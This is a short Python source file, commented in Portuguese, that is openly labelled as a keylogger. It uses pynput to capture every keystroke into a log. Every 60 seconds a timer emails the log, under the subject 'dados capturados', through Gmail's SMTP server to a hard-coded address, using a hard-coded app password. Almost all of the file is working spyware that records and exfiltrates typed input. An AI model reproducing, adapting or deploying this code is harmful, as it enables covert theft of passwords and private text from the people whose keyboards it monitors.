from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer


log = ""


#config email
EMAIL_ORIGEM = "keyloggteste@gmail.com"
EMAIL_DESTINO = "keyloggteste@gmail.com"
SENHA_EMAIl = "zbqz ztfb uhan dcvc"  

def on_press(key):
    global log
    try:
        #se for tecla `normal`
        log += key.char

    except AttributeError:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\n"
            elif key == keyboard.Key.backspace:
                log += "[<]"
            else:
                pass # ignorar control

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'dados capturados'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            # server.ssl()
            server.login(EMAIL_ORIGEM, SENHA_EMAIl)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print(f"Erro ao enviar email: {e}")

    log = ""

    # agendar proxima execucao
    Timer(60, enviar_email).start()  # envia a cada 60sec

# iniciar keylogger

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()  # iniciar envio de email
    listener.join()





